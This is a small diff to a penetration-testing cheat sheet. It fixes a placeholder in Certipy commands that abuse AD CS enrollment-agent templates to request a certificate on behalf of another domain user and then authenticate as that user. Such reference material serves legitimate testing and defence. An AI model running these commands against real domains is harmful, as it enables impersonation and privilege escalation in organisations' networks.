@@ -80,8 +80,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 The `-on-behalf` need to be  the NetBIOS  of the domain and not the FQDN. E.g. `essos` and not `essos.local`
 
 ```bash
-certipy req -u <user>@<domain> -p '<horse>' -template <condition1_template> -ca <ca> -dc-ip <adcs_ip>
-certipy req -u <user>@<domain> -p '<horse>' -template <condition2_template> -ca <ca> -on-behalf-of '<domain>\<target_user>' -pfx <user>.pfx -dc-ip <adcs_ip>
+certipy req -u <user>@<domain> -p '<password>' -template <condition1_template> -ca <ca> -dc-ip <adcs_ip>
+certipy req -u <user>@<domain> -p '<password>' -template <condition2_template> -ca <ca> -on-behalf-of '<domain>\<target_user>' -pfx <user>.pfx -dc-ip <adcs_ip>
 certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
 ```
 
